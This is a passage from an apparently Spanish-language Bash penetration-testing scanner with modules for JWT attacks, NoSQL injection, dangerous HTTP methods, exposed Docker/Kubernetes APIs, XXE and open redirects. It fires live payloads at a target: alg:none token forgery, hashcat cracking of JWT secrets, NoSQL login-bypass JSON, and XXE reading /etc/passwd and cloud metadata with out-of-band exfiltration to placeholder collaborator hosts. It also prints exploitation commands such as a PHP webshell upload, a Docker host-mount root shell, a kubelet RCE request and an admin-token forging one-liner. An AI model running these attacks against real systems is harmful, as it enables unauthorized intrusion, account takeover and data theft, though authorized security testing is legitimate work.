    jwt_in_headers=$(echo "$resp_headers" | grep -oE 'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*' | head -5)
    [[ -n "$jwt_in_headers" ]] && while IFS= read -r t; do all_jwts+=("$t"); done <<< "$jwt_in_headers"

    # Buscar en cuerpo de página
    local page_body
    page_body=$(curl -skL --max-time 10 "$base_url" 2>/dev/null)
    local jwt_in_body
    jwt_in_body=$(echo "$page_body" | grep -oE 'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*' | head -5)
    [[ -n "$jwt_in_body" ]] && while IFS= read -r t; do all_jwts+=("$t"); done <<< "$jwt_in_body"

    # Buscar en archivos JS ya analizados
    if [[ -d "${OUTPUT_DIR}/web/js_analysis" ]]; then
        local jwt_in_js
        jwt_in_js=$(grep -rohE 'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*' "${OUTPUT_DIR}/web/js_analysis/" 2>/dev/null | head -10)
        [[ -n "$jwt_in_js" ]] && while IFS= read -r t; do all_jwts+=("$t"); done <<< "$jwt_in_js"
    fi

    # Deduplicar
    local unique_jwts=()
    for tok in "${all_jwts[@]}"; do
        local already=false
        for u in "${unique_jwts[@]}"; do [[ "$u" == "$tok" ]] && already=true && break; done
        [[ "$already" == "false" ]] && unique_jwts+=("$tok")
    done

    if [[ ${#unique_jwts[@]} -eq 0 ]]; then
        ok "JWT: no se encontraron tokens en respuestas iniciales."
        intel_log "JWT: registrar manualmente con INTEL_JWT_TOKENS+=('eyJ...')"
        add_finding "INFO" "JWT Analysis" "No se encontraron JWTs en respuestas HTTP iniciales. Probar rutas de API autenticadas." \
            "N/A" "Analizar tokens obtenidos con: jwt_tool TOKEN -t alg_confusion | john --wordlist=rockyou.txt" \
            "Capturar tokens en Burp Suite durante flujo de login y analizar manualmente"
        return
    fi

    ok "JWTs encontrados: ${#unique_jwts[@]}"
    local jwt_html=""

    for jwt in "${unique_jwts[@]}"; do
        # Decodificar header y payload
        local header_b64 payload_b64
        header_b64=$(echo "$jwt" | cut -d. -f1)
        payload_b64=$(echo "$jwt" | cut -d. -f2)

        # Padding base64
        local header_json payload_json
        header_json=$(echo "${header_b64}==" | base64 -d 2>/dev/null | python3 -m json.tool 2>/dev/null || echo "decode_error")
        payload_json=$(echo "${payload_b64}==" | base64 -d 2>/dev/null | python3 -m json.tool 2>/dev/null || echo "decode_error")

        local alg
        alg=$(echo "$header_json" | grep -oE '"alg"\s*:\s*"[^"]+"' | grep -oE '"[A-Za-z0-9]+"$' | tr -d '"')
        local sub
        sub=$(echo "$payload_json" | grep -oE '"sub"\s*:\s*"[^"]+"' | grep -oE '"[^"]+\"$' | tr -d '"')

        echo "JWT: alg=${alg} sub=${sub}" >> "$out_file"
        echo "Header: ${header_json}" >> "$out_file"
        echo "Payload: ${payload_json}" >> "$out_file"

        add_finding "INFO" \
            "JWT Encontrado y Decodificado" \
            "<b>Algoritmo:</b> ${alg}<br><b>Subject:</b> ${sub}<br><b>Header:</b><pre>${header_json}</pre><b>Payload:</b><pre>${payload_json}</pre>" \
            "N/A" "" ""

        jwt_html+="<tr><td>${alg}</td><td>${sub}</td><td>${jwt:0:50}...</td></tr>"

        # ── TEST 1: alg:none ──
        local none_header
        none_header=$(echo '{"alg":"none","typ":"JWT"}' | base64 -w 0 | tr '+/' '-_' | tr -d '=')
        local none_jwt="${none_header}.${payload_b64}."
        local none_resp
        none_resp=$(curl -sk --max-time 8 \
            -H "Authorization: Bearer ${none_jwt}" \
            "${base_url}/api/me" 2>/dev/null)
        local none_status
        none_status=$(curl -sko /dev/null --max-time 8 \
            -H "Authorization: Bearer ${none_jwt}" \
            -w "%{http_code}" "${base_url}/api/me" 2>/dev/null)

        if [[ "$none_status" == "200" ]] && echo "$none_resp" | grep -qiE "user|email|id|name|role"; then
            INTEL_JWT_ALG_NONE=true
            add_finding "CRÍTICO" \
                "JWT: alg:none Aceptado — Bypass de Autenticación" \
                "<b>Token modificado (alg:none) aceptado por el servidor.</b><br>Respuesta: <pre>${none_resp:0:400}</pre>" \
                "10.0" \
                "Validar explícitamente el algoritmo en el servidor. Usar librerías seguras como python-jose con algorithm=['HS256'] explícito. Rechazar tokens con alg:none." \
                "PoC: curl -H 'Authorization: Bearer ${none_jwt}' ${base_url}/api/me"
        fi

        # ── TEST 2: RS256 → HS256 confusion ──
        if [[ "$alg" == "RS256" ]]; then
            intel_log "JWT RS256 detectado → vulnerable a confusion RS256→HS256"
            add_finding "ALTO" \
                "JWT: Algoritmo RS256 — Posible Confusion Attack" \
                "Token usa RS256. Si el servidor acepta HS256, la clave pública puede usarse como HMAC secret." \
                "8.1" \
                "Forzar el algoritmo en validación: jwt.decode(token, key, algorithms=['RS256']). Nunca aceptar múltiples algoritmos." \
                "Obtener clave pública: curl ${base_url}/.well-known/jwks.json | Usar jwt_tool para confusion: jwt_tool TOKEN -X k -pk public.pem"
        fi

        # ── TEST 3: Weak secret crack con hashcat/john ──
        if [[ "$alg" == "HS256" || "$alg" == "HS384" || "$alg" == "HS512" ]]; then
            local wordlist="/usr/share/wordlists/rockyou.txt"
            [[ ! -f "$wordlist" ]] && wordlist="/usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt"

            if [[ -f "$wordlist" ]] && command -v hashcat >/dev/null 2>&1; then
                intel_log "JWT ${alg} → intentando crack con hashcat (wordlist: $(basename $wordlist))"
                local hash_file="/tmp/jwt_hash.txt"
                echo "$jwt" > "$hash_file"

                local crack_result
                crack_result=$(hashcat -a 0 -m 16500 "$hash_file" "$wordlist" \
                    --quiet --potfile-disable 2>/dev/null | head -3)

                if [[ -n "$crack_result" ]] && echo "$crack_result" | grep -q ":"; then
                    local cracked_secret
                    cracked_secret=$(echo "$crack_result" | grep -oE ':[^:]+$' | tr -d ':')
                    INTEL_JWT_WEAK_SECRET="$cracked_secret"
                    add_finding "CRÍTICO" \
                        "JWT: Secret Débil Crackeado — '${cracked_secret}'" \
                        "<b>Secret encontrado:</b> ${cracked_secret}<br>Con este secret se puede forjar cualquier token." \
                        "10.0" \
                        "Usar un secret aleatorio de al menos 256 bits. Rotar el secret inmediatamente. Invalidar todos los tokens activos." \
                        "Forjar token de admin: python3 -c \"import jwt; print(jwt.encode({'sub':'admin','role':'admin'}, '${cracked_secret}', algorithm='HS256'))\""
                fi
            elif command -v john >/dev/null 2>&1 && [[ -f "$wordlist" ]]; then
                echo "$jwt" > "/tmp/jwt_john.txt"
                john --wordlist="$wordlist" --format=HMAC-SHA256 "/tmp/jwt_john.txt" 2>/dev/null
                local cracked
                cracked=$(john --show --format=HMAC-SHA256 "/tmp/jwt_john.txt" 2>/dev/null | grep -v "^0\|^$" | head -1)
                if [[ -n "$cracked" ]]; then
                    add_finding "CRÍTICO" "JWT: Secret Crackeado por John" "<pre>${cracked}</pre>" \
                        "10.0" "Rotar secret JWT inmediatamente. Usar mínimo 256 bits aleatorios." \
                        "Forjar tokens con el secret obtenido"
                fi
            fi
        fi
    done

    [[ -n "$jwt_html" ]] && add_finding "MEDIO" \
        "Resumen JWT: ${#unique_jwts[@]} Tokens Analizados" \
        "<table class='vuln-table'><tr><th>alg</th><th>sub</th><th>Token</th></tr>${jwt_html}</table>" \
        "5.0" "Auditar cada token. Verificar expiración, roles y claims sensibles." \
        "Análisis completo: jwt_tool TOKEN -t ALL | https://jwt.io para decodificar visualmente"
    echo
}

# ─── MÓDULO 36: NOSQLI ───────────────────────────────────────────
modulo_nosqli() {
    [[ ${#WEB_PORTS[@]} -eq 0 ]] && return
    # Solo si MongoDB u otro NoSQL detectado, o si hay APIs
    local relevant=false
    [[ " ${INTEL_TECHNOLOGIES[*]} " =~ " mongodb " ]] && relevant=true
    [[ ${#INTEL_API_ENDPOINTS[@]} -gt 0 ]] && relevant=true
    [[ "$relevant" == "false" ]] && {
        warn "NoSQLi: MongoDB/NoSQL no detectado. Ejecutar solo si hay endpoints API JSON."
        return
    }

    log "MÓDULO 36: NoSQL Injection — MongoDB y APIs JSON"
    tip "NoSQLi es frecuente en apps Node.js+MongoDB. Bypass de login sin conocer contraseña."

    local proto="http" port="${WEB_PORTS[0]}"
    [[ "$port" == "443" || "$port" == "8443" ]] && proto="https"
    local base_url="${ORIGINAL_URL:-${proto}://${TARGET}}"
    local out_file="${OUTPUT_DIR}/web/nosqli_results.txt"

    # Payloads NoSQLi — GET y POST JSON
    local GET_PAYLOADS=(
        "[\$ne]=1"
        "[\$gt]="
        "[\$where]=sleep(2000)"
        "[\$regex]=.*"
    )

    local test_urls=("${INTEL_INJECTABLE_URLS[@]}")
    [[ ${#test_urls[@]} -eq 0 ]] && test_urls+=("${base_url}/login" "${base_url}/api/login" "${base_url}/api/auth" "${base_url}/api/user")

    local found=0
    for test_url in "${test_urls[@]:0:10}"; do
        local param
        param=$(echo "$test_url" | grep -oE '[?&][a-zA-Z_]+=' | head -1 | tr -d '?&=')

        # GET payloads
        for payload in "${GET_PAYLOADS[@]}"; do
            local probe_url="${test_url%=*}${payload}"
            local resp status
            resp=$(curl -skL --max-time 10 "$probe_url" 2>/dev/null)
            status=$(curl -sko /dev/null -w "%{http_code}" --max-time 8 "$probe_url" 2>/dev/null)

            if [[ "$status" == "200" ]] && echo "$resp" | grep -qiE "token|welcome|dashboard|success|user|logged"; then
                INTEL_NOSQLI_FOUND=true
                ((found++))
                add_finding "CRÍTICO" \
                    "NoSQL Injection Detectado (GET) — ${param}" \
                    "<b>URL:</b> ${probe_url}<br><b>Respuesta:</b><pre>${resp:0:400}</pre>" \
                    "9.8" \
                    "1) Usar ODM seguro (Mongoose con schema validation). 2) Sanitizar input: escapar operadores \$ y .. 3) Usar librerías como mongo-sanitize. 4) Validar tipos de datos estrictamente." \
                    "Explotar login bypass: username[\$ne]=a&password[\$ne]=a → acceso sin credenciales"
                break
            fi
        done

        # POST JSON payloads
        local JSON_PAYLOADS=(
            '{"username":{"$ne":""},"password":{"$ne":""}}'
            '{"username":"admin","password":{"$gt":""}}'
            '{"username":{"$regex":".*"},"password":{"$regex":".*"}}'
            '{"username":"admin","password":{"$ne":null}}'
        )

        for json_pay in "${JSON_PAYLOADS[@]}"; do
            local resp status
            resp=$(curl -skL --max-time 10 -X POST \
                -H "Content-Type: application/json" \
                -d "$json_pay" \
                "$test_url" 2>/dev/null)
            status=$(curl -sko /dev/null -w "%{http_code}" --max-time 8 -X POST \
                -H "Content-Type: application/json" \
                -d "$json_pay" \
                "$test_url" 2>/dev/null)

            if [[ "$status" == "200" ]] && echo "$resp" | grep -qiE "token|jwt|welcome|dashboard|success|logged|user"; then
                INTEL_NOSQLI_FOUND=true
                ((found++))
                add_finding "CRÍTICO" \
                    "NoSQL Injection en POST JSON — Login Bypass" \
                    "<b>Endpoint:</b> ${test_url}<br><b>Payload:</b> ${json_pay}<br><b>Respuesta:</b><pre>${resp:0:400}</pre>" \
                    "9.8" \
                    "Sanitizar input JSON. Usar mongo-sanitize. Validar esquema con Joi o Zod. Rechazar objetos donde se esperan strings." \
                    "Extraer usuarios: probar {username:{\$regex:'^a'},password:{\$ne:''}} para enumerar"
                break
            fi
        done

        [[ "$INTEL_NOSQLI_FOUND" == "true" ]] && break
    done

    [[ $found -eq 0 ]] && add_finding "INFO" "NoSQL Injection" "Sin indicios de NoSQLi básico detectados." \
        "N/A" "Revisar manualmente endpoints de login/API JSON con Burp Repeater." \
        "Usar nosqlmap: python nosqlmap.py --url URL"
    echo
}

# ─── MÓDULO 37: HTTP METHODS + IIS + WINDOWS ─────────────────────
modulo_http_methods() {
    [[ ${#WEB_PORTS[@]} -eq 0 ]] && return

    log "MÓDULO 37: HTTP Methods + IIS/Windows Específico"
    tip "PUT/DELETE habilitados = escritura de archivos. TRACE = robo de cookies HttpOnly."

    local proto="http" port="${WEB_PORTS[0]}"
    [[ "$port" == "443" || "$port" == "8443" ]] && proto="https"
    local base_url="${ORIGINAL_URL:-${proto}://${TARGET}}"
    local out_file="${OUTPUT_DIR}/web/http_methods.txt"

    # OPTIONS para ver métodos permitidos
    local opts_resp
    opts_resp=$(curl -skI --max-time 10 -X OPTIONS "$base_url" 2>/dev/null)
    local allowed_methods
    allowed_methods=$(echo "$opts_resp" | grep -i "Allow:" | tr -d '\r')
    echo "OPTIONS: ${allowed_methods}" | tee -a "$out_file"

    # Test métodos peligrosos
    local DANGEROUS_METHODS=("PUT" "DELETE" "TRACE" "CONNECT" "PATCH" "DEBUG")
    local dangerous_found=""

    for method in "${DANGEROUS_METHODS[@]}"; do
        local status
        status=$(curl -sko /dev/null -w "%{http_code}" --max-time 8 -X "$method" "$base_url" 2>/dev/null)
        echo "${method}: ${status}" >> "$out_file"

        if [[ "$status" != "405" && "$status" != "501" && "$status" != "000" && "$status" != "404" ]]; then
            dangerous_found+="${method}(${status}) "

            case "$method" in
                PUT)
                    # Intentar subir archivo de prueba
                    local put_resp
                    put_resp=$(curl -sk --max-time 8 -X PUT \
                        -d "wriestavo-test" \
                        "${base_url}/wriestavo_test.txt" \
                        -w "\n%{http_code}" 2>/dev/null)
                    local put_status="${put_resp##*$'\n'}"
                    if [[ "$put_status" == "201" || "$put_status" == "204" || "$put_status" == "200" ]]; then
                        add_finding "CRÍTICO" \
                            "HTTP PUT Habilitado — Subida de Archivos Posible" \
                            "Método PUT activo. Posible subida de webshell." \
                            "9.8" \
                            "Deshabilitar método PUT en configuración del servidor web. Apache: LimitExcept GET POST { deny from all }. Nginx: if (\$request_method !~ ^(GET|POST|HEAD)\$) { return 405; }" \
                            "Subir webshell: curl -X PUT -d '<?php system(\$_GET[c]); ?>' ${base_url}/shell.php"
                        # Limpiar prueba
                        curl -sk -X DELETE "${base_url}/wriestavo_test.txt" >/dev/null 2>&1
                    fi
                    ;;
                TRACE)
                    local trace_resp
                    trace_resp=$(curl -sk --max-time 8 -X TRACE \
                        -H "Cookie: test=wriestavo_trace_test" "$base_url" 2>/dev/null)
                    if echo "$trace_resp" | grep -q "wriestavo_trace_test"; then
                        add_finding "MEDIO" \
                            "HTTP TRACE Habilitado — XST (Cross-Site Tracing)" \
                            "TRACE refleja headers incluyendo cookies. Permite robo de cookies HttpOnly via XSS." \
                            "6.1" \
                            "Deshabilitar TRACE. Apache: TraceEnable off. Nginx: ya está deshabilitado por defecto." \
                            "PoC XST: XSS + TRACE para obtener cookie HttpOnly"
                    fi
                    ;;
                DEBUG)
                    # IIS DEBUG method
                    add_finding "ALTO" \
                        "HTTP DEBUG Habilitado (IIS)" \
                        "Método DEBUG de IIS activo. Permite debugging remoto de ASP.NET." \
                        "7.5" \
                        "Deshabilitar en IIS: Denegar método DEBUG en reglas de request filtering." \
                        "Explotar: curl -X DEBUG -H 'Command: stop-debug' -H 'Accept: application/x-msdeploy' ${base_url}"
                    ;;
            esac
        fi
    done

    [[ -n "$dangerous_found" ]] && add_finding "ALTO" \
        "Métodos HTTP Peligrosos Habilitados: ${dangerous_found}" \
        "<pre>${allowed_methods}</pre>" "7.5" \
        "Deshabilitar todos los métodos HTTP no necesarios. Solo permitir GET, POST y HEAD en la mayoría de casos." \
        "Ver hallazgos individuales por método"

    # IIS específico
    if [[ "$INTEL_OS" == "windows" ]] || [[ " ${INTEL_TECHNOLOGIES[*]} " =~ " iis " ]]; then
        # IIS ShortName (8.3 filename) vulnerability
        local sn_status
        sn_status=$(curl -sko /dev/null -w "%{http_code}" --max-time 8 "${base_url}/*~1*/a.aspx" 2>/dev/null)
        if [[ "$sn_status" == "404" ]]; then
            # 404 en IIS con tilde = vulnerable (diferente de 400)
            local sn2_status
            sn2_status=$(curl -sko /dev/null -w "%{http_code}" --max-time 8 "${base_url}/a*~1*/a.aspx" 2>/dev/null)
            if [[ "$sn2_status" != "$sn_status" ]]; then
                add_finding "MEDIO" \
                    "IIS ShortName (8.3) Filename Enumeration Posible" \
                    "IIS puede revelar nombres cortos 8.3 de archivos/directorios vía respuestas HTTP diferenciales." \
                    "5.3" \
                    "Deshabilitar nombres 8.3: fsutil 8dot3name set C: 1. Actualizar IIS. Instalar hotfix MS10-070." \
                    "Usar IIS ShortName Scanner: java -jar iis_shortname_scanner.jar 2 20 ${base_url}"
            fi
        fi

        # NTLM authentication exposure
        local ntlm_check
        ntlm_check=$(curl -skI --max-time 8 -H "Authorization: NTLM TlRMTVNTUAABAAAAB4IIAAAAAAAAAAAAAAAAAAAAAAA=" \
            "$base_url" 2>/dev/null)
        if echo "$ntlm_check" | grep -qi "NTLM\|Negotiate\|WWW-Authenticate"; then
            local domain_info
            domain_info=$(echo "$ntlm_check" | grep -i "WWW-Authenticate" | head -2)
            add_finding "MEDIO" \
                "NTLM Authentication Expuesto" \
                "<pre>${domain_info}</pre>NTLM puede revelar nombre de dominio interno." \
                "5.3" \
                "Usar autenticación moderna (OAuth2/SAML). Deshabilitar NTLM donde no sea necesario." \
                "Extraer nombre de dominio: curl -sI -H 'Authorization: NTLM TlRMTVNTUAABAAAAB4IIAAAAAAAAAAAAAAAAAAAAAAA=' ${base_url} | base64 decode ntlm_challenge"
        fi
    fi
    echo
}

# ─── MÓDULO 38: DOCKER / KUBERNETES / INFRA ──────────────────────
modulo_infra_exposure() {
    log "MÓDULO 38: Docker / Kubernetes / Infraestructura Expuesta"
    tip "Docker API en 2375 sin TLS = RCE. K8s dashboard público = cluster comprometido."

    local out_file="${OUTPUT_DIR}/recon/infra_exposure.txt"

    # Docker API
    for docker_port in 2375 2376; do
        local docker_resp
        docker_resp=$(curl -sk --max-time 8 "http://${TARGET}:${docker_port}/v1.41/info" 2>/dev/null)
        if echo "$docker_resp" | grep -qiE "ServerVersion|Containers|NCPU|MemTotal|DockerRootDir"; then
            INTEL_DOCKER_EXPOSED=true
            local containers
            containers=$(curl -sk --max-time 8 "http://${TARGET}:${docker_port}/v1.41/containers/json" 2>/dev/null | \
                python3 -c "import json,sys; [print(c.get('Names',''),c.get('Image',''),c.get('Status','')) for c in json.load(sys.stdin)]" 2>/dev/null | head -10)

            add_finding "CRÍTICO" \
                "Docker API Expuesta sin Autenticación (Puerto ${docker_port})" \
                "<b>Containers activos:</b><pre>${containers}</pre><b>Info:</b><pre>${docker_resp:0:400}</pre>" \
                "10.0" \
                "1) Deshabilitar Docker API TCP sin TLS INMEDIATAMENTE. 2) Si se necesita TCP, usar TLS mutuo. 3) Usar socket Unix local /var/run/docker.sock con permisos estrictos." \
                "RCE inmediato: docker -H ${TARGET}:${docker_port} run -it --rm -v /:/mnt alpine chroot /mnt sh"

            echo "Docker API: ${TARGET}:${docker_port}" >> "$out_file"
            intel_log "CRÍTICO: Docker API expuesta → RCE posible"
        fi
    done

    # Kubernetes API / Dashboard
    for k8s_port in 8001 8080 6443 443 10250; do
        local k8s_resp
        k8s_resp=$(curl -sk --max-time 8 "https://${TARGET}:${k8s_port}/api/v1/namespaces" 2>/dev/null || \
                   curl -sk --max-time 8 "http://${TARGET}:${k8s_port}/api/v1/namespaces" 2>/dev/null)
        if echo "$k8s_resp" | grep -qiE "namespaces|kube-system|default|items"; then
            INTEL_K8S_EXPOSED=true
            add_finding "CRÍTICO" \
                "Kubernetes API Accesible sin Autenticación (Puerto ${k8s_port})" \
                "<pre>${k8s_resp:0:400}</pre>" \
                "10.0" \
                "Habilitar RBAC. Usar NetworkPolicy. Deshabilitar anonymous auth. Proteger puertos API con firewall." \
                "Listar secretos: kubectl --server=https://${TARGET}:${k8s_port} get secrets --all-namespaces"
        fi

        # Kubelet
        local kubelet_resp
        kubelet_resp=$(curl -sk --max-time 8 "https://${TARGET}:10250/pods" 2>/dev/null)
        if echo "$kubelet_resp" | grep -qiE "podList|namespace|containers"; then
            add_finding "CRÍTICO" \
                "Kubelet API Expuesta (Puerto 10250)" \
                "<pre>${kubelet_resp:0:300}</pre>" \
                "10.0" \
                "Habilitar autenticación en Kubelet: --anonymous-auth=false --authorization-mode=Webhook" \
                "RCE: curl -sk https://${TARGET}:10250/run/NAMESPACE/POD/CONTAINER -d 'cmd=id'"
        fi
    done

    # Prometheus / Grafana / Kibana sin auth
    local mgmt_ports=("9090:Prometheus" "3000:Grafana" "5601:Kibana" "9100:NodeExporter" "8500:Consul" "4646:Nomad")
    for port_svc in "${mgmt_ports[@]}"; do
        local mport="${port_svc%%:*}" mname="${port_svc##*:}"
        local mresp
        mresp=$(curl -sk --max-time 6 "http://${TARGET}:${mport}/" 2>/dev/null)
        if echo "$mresp" | grep -qiE "${mname,,}|dashboard|metrics|graph|login"; then
            local mstatus
            mstatus=$(curl -sko /dev/null -w "%{http_code}" --max-time 6 "http://${TARGET}:${mport}/" 2>/dev/null)
            [[ "$mstatus" == "200" ]] && add_finding "ALTO" \
                "${mname} Expuesto sin Autenticación (Puerto ${mport})" \
                "Panel de ${mname} accesible. Puede exponer métricas, logs o configuración interna." \
                "7.5" \
                "Proteger ${mname} con autenticación. Limitar acceso por IP/VPN. No exponer a internet." \
                "Acceder: http://${TARGET}:${mport}/ | Buscar credenciales por defecto: admin/admin, admin/secret"
        fi
    done

    # RDP BlueKeep check (nmap)
    if echo "$OPEN_PORTS_CSV" | grep -qE "(^|,)3389(,|$)"; then
        add_finding "ALTO" \
            "RDP Expuesto (Puerto 3389)" \
            "Remote Desktop Protocol accesible. Verificar NLA y CVEs como BlueKeep (CVE-2019-0708)." \
            "7.5" \
            "Habilitar NLA (Network Level Authentication). Mover RDP a puerto no estándar. Usar VPN. Aplicar parches de seguridad." \
            "Verificar BlueKeep: nmap -p 3389 --script rdp-vuln-ms12-020 ${TARGET} | Usar metasploit: use exploit/windows/rdp/cve_2019_0708_bluekeep_rce"
    fi
    echo
}



# ─── MÓDULO 39: XXE — XML EXTERNAL ENTITY ────────────────────────
modulo_xxe() {
    [[ ${#WEB_PORTS[@]} -eq 0 ]] && return

    log "MÓDULO 39: XXE — XML External Entity Injection"
    tip "XXE afecta parsers XML: SOAP, SVG upload, Office docs, APIs. Puede leer /etc/passwd o hacer SSRF."

    local proto="http" port="${WEB_PORTS[0]}"
    [[ "$port" == "443" || "$port" == "8443" ]] && proto="https"
    local base_url="${ORIGINAL_URL:-${proto}://${TARGET}}"
    local out_file="${OUTPUT_DIR}/web/xxe_results.txt"
    local found=0

    # ── INTEL READ: solo si hay APIs XML o .NET/Java detectado ──
    local relevant=false
    [[ " ${INTEL_TECHNOLOGIES[*]} " =~ " java "    ]] && relevant=true
    [[ " ${INTEL_TECHNOLOGIES[*]} " =~ " aspnet "  ]] && relevant=true
    [[ " ${INTEL_TECHNOLOGIES[*]} " =~ " dotnetcore " ]] && relevant=true
    [[ " ${INTEL_TECHNOLOGIES[*]} " =~ " php "     ]] && relevant=true
    [[ ${#INTEL_API_ENDPOINTS[@]} -gt 0 ]]            && relevant=true
    [[ "$relevant" == "false" ]] && {
        warn "XXE: sin API XML o tecnología susceptible detectada. Saltar o forzar con módulo custom."
        return
    }

    # Payloads XXE
    local XXE_BASIC='<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>'
    local XXE_WIN='<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">]><root>&xxe;</root>'
    local XXE_SSRF='<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><root>&xxe;</root>'
    local XXE_OOB='<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % remote SYSTEM "http://COLLABORATOR/evil.dtd">%remote;]><root/>'
    local XXE_PHP='<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">]><root>&xxe;</root>'
    local XXE_BLIND='<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % oob "<!ENTITY exfil SYSTEM '"'"'http://BURP/?d=%file;'"'"'>">%oob;]><root>&exfil;</root>'

    local endpoints_to_test=("${base_url}" "${base_url}/api" "${base_url}/api/v1" "${base_url}/soap" "${base_url}/ws" "${base_url}/webservice" "${base_url}/service")
    # Agregar API endpoints de intel
    for ep in "${INTEL_API_ENDPOINTS[@]}"; do
        endpoints_to_test+=("$ep")
    done

    echo "XXE Test Results — $(date)" > "$out_file"
    local xxe_html=""

    for endpoint in "${endpoints_to_test[@]}"; do
        local target_keyword
        target_keyword="${INTEL_OS:-linux}"
        local payload="$XXE_BASIC"
        [[ "$target_keyword" == "windows" ]] && payload="$XXE_WIN"

        for ct in "application/xml" "text/xml" "application/soap+xml"; do
            local resp
            resp=$(curl -sk --max-time 10 \
                -X POST \
                -H "Content-Type: ${ct}" \
                -d "$payload" \
                "$endpoint" 2>/dev/null)

            # Detectar respuesta exitosa de /etc/passwd o win.ini
            if echo "$resp" | grep -qE "root:.*:0:0|bin:.*:/bin|daemon:|nobody:|windows|for 16-bit app"; then
                ((found++))
                ok "XXE CONFIRMADO en: ${endpoint} [Content-Type: ${ct}]"
                echo "VULN: $endpoint [${ct}]" >> "$out_file"
                xxe_html+="<tr><td class='critical'>CRÍTICO</td><td>${endpoint}</td><td>${ct}</td><td>Archivo del sistema leído ✅</td></tr>"

                add_finding "CRÍTICO" \
                    "XXE — XML External Entity Injection (${ct})" \
                    "<b>Endpoint:</b> ${endpoint}<br><b>Content-Type:</b> ${ct}<br><b>Respuesta:</b><pre>${resp:0:300}</pre>" \
                    "9.1" \
                    "1) Deshabilitar procesamiento de entidades externas en el parser XML. 2) PHP: libxml_disable_entity_loader(true). 3) Java: factory.setFeature('http://xml.org/sax/features/external-general-entities', false). 4) Usar parsers seguros por defecto (no-op external entity handler)." \
                    "Leer archivos: cambiar SYSTEM 'file:///ruta'. SSRF: SYSTEM 'http://169.254.169.254/'. Para blind XXE usar Burp Collaborator."
                break 2
            fi

            # Detectar error que revela parsing XML (positivo parcial)
            if echo "$resp" | grep -qiE "xml.parse|SAXParseException|XMLSyntaxError|entity.*not.*defined|DOCTYPE.*not.*allowed"; then
                xxe_html+="<tr><td class='high'>PARCIAL</td><td>${endpoint}</td><td>${ct}</td><td>Parser XML expuesto (error revelado)</td></tr>"
                add_finding "MEDIO" \
                    "Parser XML Expuesto — Posible XXE" \
                    "<b>Endpoint:</b> ${endpoint}<br>El servidor reveló errores de parsing XML.<br><b>Respuesta:</b><pre>${resp:0:200}</pre>" \
                    "6.5" \
                    "Configurar el parser XML para no revelar errores detallados. Deshabilitar entidades externas." \
                    "Probar XXE con Burp Suite: Intruder con payloads de XXE. Ver: https://portswigger.net/web-security/xxe"
            fi

            [[ "$INTEL_SCAN_DELAY" -gt 0 ]] && sleep "0.${INTEL_SCAN_DELAY}"
        done
    done

    # SVG upload XXE (si hay formularios con file upload)
    local upload_test
    upload_test=$(curl -sk --max-time 10 \
        -X POST \
        -F "file=@/dev/stdin;filename=test.svg;type=image/svg+xml" \
        -d '<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><svg>&xxe;</svg>' \
        "${base_url}/upload" 2>/dev/null || true)
    if echo "$upload_test" | grep -qE "root:.*:0:0|bin:.*:/bin"; then
        add_finding "CRÍTICO" "XXE via SVG Upload" \
            "El endpoint /upload procesa SVG con entidades externas. Archivo del sistema leído." \
            "9.1" \
            "Validar tipo de archivo por contenido (magic bytes), no por extensión. Sanitizar SVG antes de procesar. No renderizar SVG del usuario server-side." \
            "Subir SVG con payload XXE. Cambiar 'file:///etc/passwd' por otros archivos sensibles."
    fi

    if (( found == 0 )); then
        ok "XXE: no se detectó XXE básico en endpoints probados."
        add_finding "INFO" "XXE" \
            "No se detectó XXE básico. Blind XXE (Out-of-Band) requiere Burp Collaborator." \
            "N/A" \
            "Revisar manualmente endpoints que acepten XML. Probar SVG/Office uploads." \
            "Herramienta especializada: XXEinjector | Burp Suite Pro con XXE scanner"
    else
        add_finding "CRÍTICO" "Resumen XXE: ${found} endpoint(s) vulnerables" \
            "<table class='vuln-table'><tr><th>Severidad</th><th>Endpoint</th><th>Content-Type</th><th>Resultado</th></tr>${xxe_html}</table>" \
            "9.1" \
            "Aplicar remediación en TODOS los parsers XML del stack. Revisar dependencias que parseen XML (librerías, formatos de Office, feeds RSS)." \
            "Ver archivo completo: ${out_file}"
    fi
    echo
}

# ─── MÓDULO 40: OPEN REDIRECT + IDOR ─────────────────────────────
modulo_idor_redirect() {
    [[ ${#WEB_PORTS[@]} -eq 0 ]] && return

    log "MÓDULO 40: Open Redirect + IDOR (Insecure Direct Object Reference)"
    tip "Open Redirect → phishing bypass. IDOR → acceso a datos de otros usuarios. Muy comunes en bug bounty."

    local proto="http" port="${WEB_PORTS[0]}"
    [[ "$port" == "443" || "$port" == "8443" ]] && proto="https"
    local base_url="${ORIGINAL_URL:-${proto}://${TARGET}}"
    local out_file="${OUTPUT_DIR}/web/idor_redirect.txt"
    local found_redirect=0 found_idor=0

    echo "Open Redirect + IDOR — $(date)" > "$out_file"

    # ═══════════════════════════════════════════════════════
    # PARTE 1: OPEN REDIRECT
    # ═══════════════════════════════════════════════════════
    log "  ── Open Redirect ──"

    local REDIRECT_PARAMS=("redirect" "url" "next" "return" "returnUrl" "returnTo" "redir" "redirect_to"
        "redirect_url" "goto" "go" "continue" "dest" "destination" "forward" "location" "target"
        "to" "link" "callback" "out" "view" "site" "web" "ref" "back" "r" "l")

    local REDIRECT_PAYLOADS=(
        "//evil.com"
        "https://evil.com"
        "//evil.com/%2F.."
        "https:evil.com"
        "//evil%2Ecom"
        "/\\evil.com"
        "///evil.com"
        "/%09/evil.com"
        "https://evil.com?@${TARGET}"
        "https://${TARGET}.evil.com"
    )

    # Usar URLs de gobuster/arjun que tienen parámetros
